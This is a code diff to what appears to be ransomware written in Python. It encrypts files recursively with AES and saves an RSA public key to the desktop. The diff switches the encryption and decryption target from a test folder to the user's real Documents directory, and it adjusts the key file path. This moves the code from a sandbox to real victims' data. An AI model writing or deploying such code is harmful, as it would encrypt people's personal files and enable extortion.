@@ -62,9 +62,8 @@ def encrypt_rsa(a_message, key):
 
 # Encrypting / Decrypting Files
 def encrypt_files(aes_key):
-    # directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
     print("Encrypted Files:")
-    directory = os.fsencode(f'D:\\test')
+    directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
     _encrypt_files(aes_key, directory)
 
 def _encrypt_files(aes_key, root_directory):
@@ -80,9 +79,8 @@ def _encrypt_files(aes_key, root_directory):
                 encrypt_aes(file_full_path, aes_key)
 
 def decrypt_files(aes_key):
-    # directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
     print("Decrypted Files:")
-    directory = os.fsencode(f'D:\\test')
+    directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
     _decrypt_files(aes_key, directory)
 
 def _decrypt_files(aes_key, root_directory):
@@ -101,7 +99,7 @@ def _decrypt_files(aes_key, root_directory):
 # Saving / Loading Public Key
 def store_public_key_on_desktop(public_key):
     file = open(
-        f'C:\\Users\\{USERNAME}\\OneDrive\\Desktop\\PublicKey.key', 'w')
+        f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'w')
     public_key_bytes = public_key.export_key('PEM')
     public_key_str = public_key_bytes.decode("utf-8")
     file.write(public_key_str)
@@ -110,7 +108,7 @@ def store_public_key_on_desktop(public_key):
 
 def read_public_key_from_desktop():
     file = open(
-        f'C:\\Users\\{USERNAME}\\OneDrive\\Desktop\\PublicKey.key', 'r')
+        f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'r')
     public_key_str = file.read()
     public_key_bytes = public_key_str.encode("utf-8")
     key = RSA.import_key(public_key_bytes)
